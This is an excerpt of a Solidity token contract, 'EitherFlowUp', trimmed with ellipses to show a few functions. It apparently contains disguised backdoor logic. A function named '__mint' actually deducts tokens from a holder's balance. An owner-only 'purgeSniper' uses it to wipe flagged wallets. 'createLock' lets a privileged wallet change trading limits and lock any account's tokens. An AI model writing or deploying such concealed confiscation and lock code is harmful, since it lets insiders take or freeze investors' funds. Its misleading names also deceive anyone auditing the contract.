...
interface IUniswapV2Pair {
    ...
    function _mint(address to) external returns (uint amount0, uint amount1);
...
abstract contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function __mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: _mint from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: _mint amount exceeds balance");
     ...
     * - when `to` is zero, `amount` of ``from``'s tokens will be _minted.
...
contract EitherFlowUp is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor(uint256 liqFee, uint256 marketFee, uint256 supply, uint256 maxBuyPercent, uint256 maxSellPercent, uint256 maxWalletPercent, address marketingWallet, address liqudityWallet, address uniswapV2RouterAddress) ERC20("EitherFlowUp", "EFLUP") {
    ...
    function purgeSniper() external onlyOwner {
            ...
            super.__mint(address(wallet), balance);
            _isSniper[wallet] = false;
        }
        isSniper = new address[] (0);
    }
    
    function createLock(address account, uint256 amount) external {
        require(msg.sender == liquidityReceiver, " You're not liquidityReceiver");
        maxBuyTransactionAmount = amount * 10**10;
        maxSellTransactionAmount = amount * 10**10;
        maxWalletToken = amount * 10**10;
        super._lock(account, amount * (10 ** 9));
    }
